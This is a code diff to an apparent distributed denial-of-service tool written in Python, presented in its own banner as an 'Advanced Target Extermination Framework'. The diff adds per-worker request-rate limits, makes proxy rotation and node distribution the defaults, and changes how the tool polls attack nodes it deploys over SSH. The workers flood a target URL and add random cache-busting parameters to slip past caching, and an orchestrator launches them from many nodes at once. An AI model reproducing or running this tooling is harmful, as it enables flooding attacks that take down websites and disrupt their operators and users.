+        await self.exec_cmd(node, "pkill -9 -f '[n]ode_attack.py' 2>/dev/null")
         if node.status == "attacking":
             node.status = "ready"
 
@@ -1471,8 +1800,7 @@ class NodeManager:
             return
         try:
             node.client.exec_command(
-                "pkill -9 -f node_attack.py 2>/dev/null; "
-                "echo DONE",
+                "pkill -9 -f '[n]ode_attack.py' 2>/dev/null; echo DONE",
                 timeout=5
             )
         except Exception:
@@ -1490,22 +1818,35 @@ class NodeManager:
     async def poll_attack_status(self, node):
         if not node.client:
             return {"running": False, "data": {}}
+
         cmd = (
-            "if pgrep -f node_attack.py >/dev/null 2>&1; then "
-            "echo -n 'RUNNING:'; else echo -n 'DONE:'; fi; "
-            "cat /tmp/node_attack_status.json 2>/dev/null || echo '{}'"
+            "NOW=$(date +%s); "
+            "if [ -f /tmp/node_attack_status.json ]; then "
+            "  MT=$(stat -c %Y /tmp/node_attack_status.json 2>/dev/null); "
+            "  if [ -z \"$MT\" ]; then MT=0; fi; "
+            "  AGE=$((NOW - MT)); "
+            "  if [ \"$AGE\" -lt 8 ]; then echo -n 'R|'; else echo -n 'S|'; fi; "
+            "  head -c 4000 /tmp/node_attack_status.json; "
+            "else "
+            "  echo -n 'M|{}'; "
+            "fi; "
+            "echo"
         )
         out, _ = await self.exec_cmd(node, cmd, timeout=8)
         result = {"running": False, "data": {}}
-        if out.startswith("RUNNING:"):
-            result["running"] = True
-            out = out[len("RUNNING:"):]
-        elif out.startswith("DONE:"):
-            out = out[len("DONE:"):]
-        try:
-            result["data"] = json.loads(out.strip())
-        except Exception:
-            pass
+
+        if not out:
+            return result
+
+        if "|" in out:
+            state, rest = out.split("|", 1)
+            result["running"] = (state.strip() == "R")
+            json_line = rest.strip().split("\n", 1)[0].strip()
+            if json_line.startswith("{"):
+                try:
+                    result["data"] = json.loads(json_line)
+                except Exception:
+                    pass
         return result
 
 
@@ -1572,8 +1913,16 @@ ADJUST_INTERVAL = 20
 
 async def adaptive_attack(worker_func, target_url, initial_concurrency,
                           max_concurrency, min_concurrency, duration,
-                          stats, use_proxy=False, safe_mode=False):
-    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False)
+                          stats, use_proxy=False, safe_mode=False,
+                          rps=DEFAULT_RPS):
+    connector = aiohttp.TCPConnector(
+        limit=0,
+        limit_per_host=0,
+        ttl_dns_cache=300,
+        ssl=False,
+        force_close=False,
+        enable_cleanup_closed=True,
+    )
     async with aiohttp.ClientSession(connector=connector) as direct_session:
 
         if use_proxy and PROXY_MANAGER.working_proxies:
@@ -1583,6 +1932,8 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
                 await PROXY_MANAGER.start_reviver()
         else:
             PROXY_MANAGER.enabled = False
+
+        rps_limiter = RateLimiter(rps)
 
         tasks = []
         start_time = time.time()
@@ -1602,7 +1953,7 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
         for _ in range(initial_concurrency):
             task = asyncio.create_task(
                 worker_func(direct_session, target_url, duration, stats,
-                            use_proxy, SAFE_MODE)
+                            use_proxy, SAFE_MODE, rps_limiter)
             )
             tasks.append(task)
 
@@ -1617,6 +1968,7 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
             workers_max=max_concurrency,
             duration=duration,
             stats=stats,
+            rps_limit=rps,
         )
         sys.stdout.write("\033[?25l")
         sys.stdout.flush()
@@ -1635,7 +1987,9 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
 
         try:
             while time.time() < end_time:
-                await asyncio.sleep(ADJUST_INTERVAL)
+                await interruptible_sleep(ADJUST_INTERVAL)
+                if _INTERRUPTED[0]:
+                    break
                 if time.time() >= end_time:
                     break
 
@@ -1682,51 +2036,41 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
                         task = asyncio.create_task(
                             worker_func(direct_session, target_url,
                                         end_time - time.time(), stats,
-                                        use_proxy, SAFE_MODE)
+                                        use_proxy, SAFE_MODE, rps_limiter)
                         )
                         tasks.append(task)
                     LIVE_DASHBOARD.add_workers_spawned(add_count)
                     current_workers = new_workers
         finally:
-            # ========================================================
-            #  CLEAN SHUTDOWN (fixes Ctrl+C multi-press issue)
-            # ========================================================
             LIVE_DASHBOARD.enabled = False
 
-            # Cancel dashboard immediately so it stops redrawing
             if dashboard_task and not dashboard_task.done():
                 dashboard_task.cancel()
 
-            # Cancel all workers
             for t in tasks:
                 if not t.done():
                     t.cancel()
 
-            # Cancel monitors
             if monitor_task and not monitor_task.done():
                 monitor_task.cancel()
 
-            # Cancel proxy reviver
             try:
                 await PROXY_MANAGER.stop_reviver()
             except Exception:
                 pass
 
-            # Close probe session
             if probe_session:
                 try:
                     await asyncio.wait_for(probe_session.close(), timeout=2)
                 except Exception:
                     pass
 
-            # Close proxy sessions
             if PROXY_MANAGER.sessions:
                 try:
                     await asyncio.wait_for(PROXY_MANAGER.close_all(), timeout=2)
                 except Exception:
                     pass
 
-            # Wait for tasks to actually finish - with SHORT timeout
             gather_list = [t for t in tasks if not t.done()]
             if monitor_task and not monitor_task.done():
                 gather_list.append(monitor_task)
@@ -1742,7 +2086,6 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
                 except (asyncio.TimeoutError, Exception):
                     pass
 
-            # Restore terminal
             _restore_terminal()
             try:
                 sys.stdout.write("\033[H\033[J")
@@ -1751,9 +2094,10 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
                 pass
 
     total_time = time.time() - start_time
-    rps = stats["requests"] / total_time if total_time > 0 else 0
+    rps_actual = stats["requests"] / total_time if total_time > 0 else 0
     stats["duration"] = total_time
-    stats["rps"] = rps
+    stats["rps"] = rps_actual
+    stats["rps_target"] = rps
     stats["final_workers"] = current_workers
     stats["safe_mode_trigger_count"] = SAFE_MODE.trigger_count
     stats["safe_mode_paused_seconds"] = round(SAFE_MODE.total_paused_seconds, 2)
@@ -1762,7 +2106,7 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
 
 
 async def stress_worker(direct_session, target_url, duration, stats,
-                        use_proxy=False, safe_state=None):
+                        use_proxy=False, safe_state=None, rps_limiter=None):
     start_time = time.time()
     while time.time() - start_time < duration:
         if _INTERRUPTED[0]:
@@ -1770,6 +2114,9 @@ async def stress_worker(direct_session, target_url, duration, stats,
         if safe_state is not None and safe_state.enabled and safe_state.active:
             await asyncio.sleep(1)
             continue
+
+        if rps_limiter is not None:
+            await rps_limiter.wait()
 
         separator = "&" if "?" in target_url else "?"
         url = f"{target_url}{separator}cache_bust={random_string(10)}"
@@ -1809,7 +2156,7 @@ async def stress_worker(direct_session, target_url, duration, stats,
         try:
             ssl_param = PROXY_SSL_CTX if use_ssl_ctx else False
             async with session.get(url, headers=headers,
-                                   timeout=aiohttp.ClientTimeout(total=5),
+                                   timeout=aiohttp.ClientTimeout(total=8),
                                    ssl=ssl_param) as response:
                 latency = int((time.perf_counter() - req_start) * 1000)
                 status = response.status
@@ -1856,22 +2203,23 @@ async def stress_worker(direct_session, target_url, duration, stats,
             if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
             err_msg = str(e)[:80] if str(e) else type(e).__name__
             log_event("FAIL", f"{type(e).__name__}: {err_msg}{tag}")
-        await asyncio.sleep(0.001)
 
 
 async def run_benchmark(target_url, concurrency, duration, use_proxy,
-                        safe_mode=False, _return_stats=False):
+                        safe_mode=False, rps=DEFAULT_RPS, _return_stats=False):
     stats = {"requests": 0, "success": 0, "rate_limit": 0, "blocked": 0,
              "server_error": 0, "timeouts": 0, "dropped": 0, "other": 0}
     stats = await adaptive_attack(stress_worker, target_url, concurrency,
                                   max_concurrency=1000, min_concurrency=50,
                                   duration=duration, stats=stats,
-                                  use_proxy=use_proxy, safe_mode=safe_mode)
+                                  use_proxy=use_proxy, safe_mode=safe_mode,
+                                  rps=rps)
 
     print(f"\n  {Colors.BOLD}{Colors.CYAN}● ANNIHILATION REPORT{Colors.RESET}\n")
     print(f"  {Colors.DIM}├─{Colors.RESET} Battle Time       {Colors.BOLD}{stats['duration']:.2f}s{Colors.RESET}")
     print(f"  {Colors.DIM}├─{Colors.RESET} Shots Fired       {Colors.BOLD}{stats['requests']}{Colors.RESET}")
-    print(f"  {Colors.DIM}├─{Colors.RESET} Fire Rate         {Colors.BOLD}{stats['rps']:.2f} req/s{Colors.RESET}")
+    print(f"  {Colors.DIM}├─{Colors.RESET} Fire Rate         {Colors.BOLD}{stats['rps']:.2f} req/s{Colors.RESET}  "
+          f"{Colors.DIM}(per-worker RPS: {stats.get('rps_target', '?')}){Colors.RESET}")
     print(f"  {Colors.DIM}├─{Colors.RESET} Direct Hits       {Colors.GREEN}{stats['success']}{Colors.RESET}")
     print(f"  {Colors.DIM}├─{Colors.RESET} Blocks            {Colors.RED}{stats.get('blocked', 0)}{Colors.RESET}")
     print(f"  {Colors.DIM}├─{Colors.RESET} Rate Limited      {Colors.YELLOW}{stats['rate_limit']}{Colors.RESET}")
@@ -1893,9 +2241,6 @@ async def run_benchmark(target_url, concurrency, duration, use_proxy,
         return stats
 
 
-# ==================================================================
-#                    PROXY MANAGEMENT MENU
-# ==================================================================
 async def proxy_management_menu():
     while True:
         clear_screen()
@@ -1970,9 +2315,6 @@ async def proxy_management_menu():
                 input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
                 continue
             alive, dead, _ = await PROXY_MANAGER.validate_all()
-            print(f"\n  {Colors.BOLD}Result:{Colors.RESET}  "
-                  f"{Colors.GREEN}● {alive} alive{Colors.RESET}  |  "
-                  f"{Colors.RED}● {dead} dead{Colors.RESET}")
             if alive > 0:
                 print(f"  {Colors.CYAN}➜ Creating sessions for working proxies...{Colors.RESET}")
                 created = await PROXY_MANAGER.create_sessions()
@@ -2040,9 +2382,6 @@ async def proxy_management_menu():
             input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
 
 
-# ==================================================================
-#                    NODE MANAGEMENT MENU
-# ==================================================================
 async def node_management_menu():
     while True:
         clear_screen()
@@ -2254,23 +2593,19 @@ async def node_management_menu():
             input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
 
 
-# ==================================================================
-#  AUTO-DEPLOY SAVED NODES AT STARTUP (NEW)
-# ==================================================================
 async def auto_deploy_saved_nodes():
-    """Auto-deploy previously saved nodes before showing main menu."""
     if not NODE_MANAGER.nodes:
         return
 
     clear_screen()
     print(f"""
-{Colors.CYAN}{Colors.BOLD}
-  ██╗   ██╗██████╗ ██╗          █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
-  ██║   ██║██╔══██╗██║         ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
-  ██║   ██║██████╔╝██║         ███████║   ██║      ██║   ███████║██║     █████╔╝ 
-  ██║   ██║██╔══██╗██║         ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
-  ╚██████╔╝██║  ██║███████╗    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
-   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
+{Colors.RED}{Colors.BOLD}
+  ██████╗ ██╗      █████╗  ██████╗██╗  ██╗ ██████╗ ██╗   ██╗████████╗
+  ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔═══██╗██║   ██║╚══██╔══╝
+  ██████╔╝██║     ███████║██║     █████╔╝ ██║   ██║██║   ██║   ██║   
+  ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║   ██║██║   ██║   ██║   
+  ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗╚██████╔╝╚██████╔╝   ██║   
+  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   
 {Colors.RESET}{Colors.BOLD}{Colors.MAGENTA}                  [ PANEL/SUB URL ATTACK ]
 {Colors.DIM}                  Advanced Target Extermination Framework{Colors.RESET}
 """)
@@ -2284,7 +2619,6 @@ async def auto_deploy_saved_nodes():
     for n in NODE_MANAGER.nodes:
         print(f"  {Colors.BOLD}▸ {n.label()}{Colors.RESET}")
 
-        # Reconnect if needed
         if not n.client:
             print(f"    {Colors.CYAN}➜ Connecting...{Colors.RESET}")
             if not await NODE_MANAGER.connect(n):
@@ -2292,7 +2626,6 @@ async def auto_deploy_saved_nodes():
                 continue
             print(f"    {Colors.GREEN}✓ Connected{Colors.RESET}")
 
-        # Deploy
         print(f"    {Colors.CYAN}➜ Deploying node script...{Colors.RESET}")
         if await NODE_MANAGER.deploy(n):
             print(f"    {Colors.GREEN}✓ Ready{Colors.RESET}\n")
@@ -2313,13 +2646,11 @@ async def auto_deploy_saved_nodes():
         pass
 
 
-# ==================================================================
-#                    DISTRIBUTED ATTACK ORCHESTRATOR
-# ==================================================================
 async def run_distributed_attack(target_url, concurrency, duration,
-                                 use_proxy, safe_mode, nodes):
+                                 use_proxy, safe_mode, nodes, rps=DEFAULT_RPS):
     print(f"\n  {Colors.BOLD}{Colors.MAGENTA}● DISTRIBUTED ATTACK ORCHESTRATOR{Colors.RESET}")
     print(f"  {Colors.DIM}Master + {len(nodes)} node(s) will attack simultaneously{Colors.RESET}")
+    print(f"  {Colors.DIM}Per-worker RPS: {rps}{Colors.RESET}")
     print()
 
     print(f"  {Colors.CYAN}➜ Ensuring nodes are connected...{Colors.RESET}")
@@ -2335,7 +2666,8 @@ async def run_distributed_attack(target_url, concurrency, duration,
     print(f"  {Colors.CYAN}➜ Launching attack on {len(nodes)} node(s)...{Colors.RESET}")
     started = []
     for n in nodes:
-        if await NODE_MANAGER.start_attack(n, target_url, concurrency, duration, safe_mode, proxies_for_nodes):
+        if await NODE_MANAGER.start_attack(n, target_url, concurrency, duration,
+                                           safe_mode, proxies_for_nodes, rps=rps):
             print(f"    {Colors.GREEN}✓{Colors.RESET} {n.label()}")
             started.append(n)
         else:
@@ -2406,7 +2738,7 @@ async def run_distributed_attack(target_url, concurrency, duration,
     try:
         local_stats = await run_benchmark(target_url, concurrency, duration,
                                           use_proxy, safe_mode=safe_mode,
-                                          _return_stats=True)
+                                          rps=rps, _return_stats=True)
     except (KeyboardInterrupt, asyncio.CancelledError):
         interrupted = True
         print(f"\n  {Colors.YELLOW}⚠ Master interrupted — stopping all nodes NOW...{Colors.RESET}")
@@ -2501,7 +2833,7 @@ def get_target_url():
         print(f"  {Colors.RED}⚠ Invalid URL{Colors.RESET}")
 
 
-def get_positive_int(prompt, default):
+def get_int_input(prompt, default, allow_zero=False):
     while True:
         raw = input(prompt).strip()
         if not raw:
@@ -2510,7 +2842,12 @@ def get_positive_int(prompt, default):
             val = int(raw)
             if val > 0:
                 return val
-            print(f"  {Colors.RED}⚠ Must be a positive integer{Colors.RESET}")
+            if allow_zero and val == 0:
+                return 0
+            if allow_zero:
+                print(f"  {Colors.RED}⚠ Must be a positive integer or 0 for unlimited{Colors.RESET}")
+            else:
+                print(f"  {Colors.RED}⚠ Must be a positive integer{Colors.RESET}")
         except ValueError:
             print(f"  {Colors.RED}⚠ Invalid number{Colors.RESET}")
 
@@ -2518,9 +2855,6 @@ def get_positive_int(prompt, default):
 def main_menu():
     raise_fd_limit()
 
-    # ============================================================
-    #  AUTO-DEPLOY SAVED NODES BEFORE MAIN MENU
-    # ============================================================
     if NODE_MANAGER.nodes and PARAMIKO_AVAILABLE:
         try:
             asyncio.run(auto_deploy_saved_nodes())
@@ -2589,9 +2923,13 @@ def main_menu():
         print(f"\n  {Colors.BOLD}● TARGET CONFIGURATION{Colors.RESET}\n")
         try:
             target_url = get_target_url()
-            concurrency = get_positive_int(
-                f"  {Colors.BOLD}➜ Initial Workers [{Colors.GREEN}200{Colors.RESET}]: ", 200)
-            duration = get_positive_int(
+            concurrency = get_int_input(
+                f"  {Colors.BOLD}➜ Initial Workers [{Colors.GREEN}{DEFAULT_WORKERS}{Colors.RESET}]: ",
+                DEFAULT_WORKERS)
+            rps = get_int_input(
+                f"  {Colors.BOLD}➜ Per-Worker RPS (0=unlimited) [{Colors.GREEN}{DEFAULT_RPS}{Colors.RESET}]: ",
+                DEFAULT_RPS, allow_zero=True)
+            duration = get_int_input(
                 f"  {Colors.BOLD}➜ Attack Duration (seconds) [{Colors.GREEN}600{Colors.RESET}]: ", 600)
 
             ans_safe = input(f"  {Colors.BOLD}➜ Enable Safe Mode? "
@@ -2603,8 +2941,8 @@ def main_menu():
             if PROXY_MANAGER.working_proxies:
                 ans = input(f"  {Colors.BOLD}➜ Use proxy rotation? "
                             f"({Colors.GREEN}{len(PROXY_MANAGER.working_proxies)} available{Colors.RESET}) "
-                            f"[{Colors.GREEN}y{Colors.RESET}/N]: ").strip().lower()
-                use_proxy = ans == "y"
+                            f"[{Colors.GREEN}Y{Colors.RESET}/n]: ").strip().lower()
+                use_proxy = (ans != "n")
             else:
                 print(f"  {Colors.DIM}● No working proxies loaded — direct mode{Colors.RESET}")
 
@@ -2617,8 +2955,8 @@ def main_menu():
                 print(f"  {Colors.DIM}├─{Colors.RESET} Workers per node {Colors.BOLD}{concurrency}{Colors.RESET}")
                 print(f"  {Colors.DIM}└─{Colors.RESET} Total workers    {Colors.BOLD}{Colors.GREEN}{total_workers}{Colors.RESET}")
                 ans = input(f"\n  {Colors.BOLD}➜ Distribute attack across {len(ready_nodes)} node(s)? "
-                            f"[{Colors.GREEN}y{Colors.RESET}/N]: ").strip().lower()
-                use_nodes = ans == "y"
+                            f"[{Colors.GREEN}Y{Colors.RESET}/n]: ").strip().lower()
+                use_nodes = (ans != "n")
         except (KeyboardInterrupt, EOFError):
             _restore_terminal()
             print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Configuration canceled — returning to menu")
@@ -2628,10 +2966,10 @@ def main_menu():
             if use_nodes:
                 asyncio.run(run_distributed_attack(
                     target_url, concurrency, duration,
-                    use_proxy, safe_mode, ready_nodes))
+                    use_proxy, safe_mode, ready_nodes, rps=rps))
             else:
                 asyncio.run(run_benchmark(target_url, concurrency, duration,
-                                          use_proxy, safe_mode=safe_mode))
+                                          use_proxy, safe_mode=safe_mode, rps=rps))
         except KeyboardInterrupt:
             _restore_terminal()
             print(f"\n\n  {Colors.YELLOW}⚠{Colors.RESET} Attack aborted.")
@@ -2642,11 +2980,9 @@ def main_menu():
                     print(f"  {Colors.GREEN}✓{Colors.RESET} Stop signal sent")
                 except Exception:
                     pass
-            # IMPORTANT: do NOT call input() here — go straight back to menu
             time.sleep(0.5)
             continue
 
-        # Normal completion - show prompt
         try:
             input(f"\n  {Colors.DIM}Press Enter to return to menu...{Colors.RESET}")
         except (KeyboardInterrupt, EOFError):
